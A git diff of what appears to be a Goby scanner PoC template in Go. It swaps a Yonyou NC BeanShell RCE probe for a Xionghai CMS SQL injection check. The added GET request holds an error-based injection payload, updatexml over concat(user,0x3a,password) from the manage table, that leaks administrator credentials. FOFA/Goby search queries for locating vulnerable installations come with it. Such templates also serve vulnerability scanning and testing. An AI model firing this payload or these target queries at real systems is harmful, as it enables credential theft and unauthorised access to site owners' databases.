@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "熊海cms SQL注入",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "Author": "",
+  "FofaQuery": "app=\"熊海内容管理系统(SEACMS)\" || product=\"熊海内容管理系统(SEACMS)\"",
+  "GobyQuery": "app=\"熊海内容管理系统(SEACMS)\" || product=\"熊海内容管理系统(SEACMS)\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/?r=content&cid=1%20or%20updatexml(1,concat(0x7e,(select%20concat(user,0x3a,password)%20from%20manage)),1)",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -42,16 +42,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "syntax error",
             "bz": ""
           }
         ]
@@ -107,7 +100,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "熊海cms SQL注入",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +109,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "xionghai cms SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
